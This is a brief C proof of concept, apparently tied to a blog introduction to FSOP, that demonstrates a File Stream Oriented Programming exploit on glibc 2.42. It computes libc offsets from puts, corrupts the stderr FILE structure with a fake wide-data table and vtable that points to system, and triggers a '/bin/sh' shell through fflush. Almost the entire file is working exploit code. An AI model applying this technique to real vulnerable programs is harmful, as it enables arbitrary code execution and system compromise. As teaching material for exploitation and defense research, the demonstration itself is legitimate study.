// glibc 2.42
// https://zeroclick.sh/blog/fsop-intro/

#include<stdio.h>
#include<stdlib.h>
 
char* stderr2;
 
int main () {
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);

    size_t puts_addr = (size_t)&puts;
    size_t libc_base_addr = puts_addr - 0x82c80;
    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x20a4e0;
    size_t _IO_wfile_jumps_addr = libc_base_addr + 0x208228;

    stderr2 = (char*) _IO_2_1_stderr_addr;
    char *wide_data = calloc(0x200, 1);
    char *wide_vtable = calloc(0x200, 1);

    *(size_t *)(stderr2) = (size_t) 0x68732f6e69622f;
    *(size_t *)(stderr2 + 0xd8) = (size_t) _IO_wfile_jumps_addr - 0x18;
    *(size_t *)(stderr2 + 0xa0) = (size_t) wide_data;

    *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
    *(size_t *)(wide_data + 0x20) = (size_t) 0x1;

    *(size_t *)(wide_vtable + 0x18) = (size_t) &system;

    fflush(stderr);
}